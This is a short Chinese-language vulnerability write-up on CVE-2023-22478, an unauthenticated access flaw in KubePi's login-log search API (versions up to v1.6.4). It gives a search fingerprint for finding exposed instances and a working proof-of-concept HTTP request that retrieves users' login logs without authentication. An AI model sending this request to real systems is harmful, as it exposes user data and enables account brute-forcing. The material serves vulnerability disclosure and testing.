# KubePi LoginLogsSearch 未授权访问漏洞 CVE-2023-22478

## 漏洞描述

KubePi LoginLogsSearch 方法下的接口存在未授权访问漏洞，攻击者通过漏洞可以未授权获取用户的登录日志信息，进一步爆破用户

## 漏洞影响

<a-checkbox checked>KubePi <= v1.6.4</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"kubepi"</a-checkbox></br>

## 漏洞复现

登录页面

![img](/assets/PeiQi-Wiki/img/1682440791240-01629ee9-05d4-4eff-a15f-aede8707d482.png)

补丁中对路由加了身份验证

![img](/assets/PeiQi-Wiki/img/1682440845494-1d058852-8474-4681-bd3e-6b1545000a75.png)

对应的接口为

![img](/assets/PeiQi-Wiki/img/1682440907690-5156d5b7-4e4d-4a33-9d79-7d489e0411a9.png)



验证POC

```php
POST /kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10 HTTP/1.1
Content-Type: application/json

{}
```

![img](/assets/PeiQi-Wiki/img/1682440828484-ab47f1ea-42c1-4ec1-af79-0832a6e277ad.png)